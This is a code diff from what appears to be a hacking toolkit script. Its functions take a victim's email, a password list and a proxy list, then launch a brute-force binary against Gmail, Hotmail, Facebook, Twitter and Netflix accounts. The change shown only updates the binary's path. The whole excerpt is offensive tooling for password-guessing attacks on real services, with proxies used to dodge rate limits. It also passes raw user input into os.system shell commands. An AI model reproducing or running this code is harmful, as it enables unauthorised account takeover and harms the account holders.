@@ -573,7 +573,7 @@ def gmail_bruteforce():
     plist = input('\nEnter the password-list path(/path/to/file): ')
     proxy_list = input('\nEnter the proxy-list path(/path/to/file):')
 
-    os.system(f'brute-force -g {mail} -l {plist} -X {proxy_list}')
+    os.system(f'lib/./brute-force -g {mail} -l {plist} -X {proxy_list}')
 
 
 def hotmail_bruteforce():
@@ -584,7 +584,7 @@ def hotmail_bruteforce():
     plist = input('\nEnter the password-list path(/path/to/file): ')
     proxy_list = input('\nEnter the proxy-list path(/path/to/file):')
 
-    os.system(f'brute-force -t {mail} -l {plist} -X {proxy_list}')
+    os.system(f'lib/./brute-force -t {mail} -l {plist} -X {proxy_list}')
 
 
 def facebook_bruteforce():
@@ -595,7 +595,7 @@ def facebook_bruteforce():
     plist = input('\nEnter the password-list path(/path/to/file): ')
     proxy_list = input('\nEnter the proxy-list path(/path/to/file):')
 
-    os.system(f'brute-force -f {mail} -l {plist} -X {proxy_list}')
+    os.system(f'lib/./brute-force -f {mail} -l {plist} -X {proxy_list}')
 
 def twitter_bruteforce():
     os.system('clear')
@@ -605,7 +605,7 @@ def twitter_bruteforce():
     plist = input('\nEnter the password-list path(/path/to/file): ')
     proxy_list = input('\nEnter the proxy-list path(/path/to/file):')
 
-    os.system(f'brute-force -T {mail} -l {plist} -X {proxy_list}')
+    os.system(f'lib/./brute-force -T {mail} -l {plist} -X {proxy_list}')
 
 
 
@@ -617,7 +617,7 @@ def netflix_bruteforce():
     plist = input('\nEnter the password-list path(/path/to/file): ')
     proxy_list = input('\nEnter the proxy-list path(/path/to/file):')
 
-    os.system(f'brute-force -n {mail} -l {plist} -X {proxy_list}')
+    os.system(f'lib/./brute-force -n {mail} -l {plist} -X {proxy_list}')
 
 def bruteforce():
     os.system('clear')
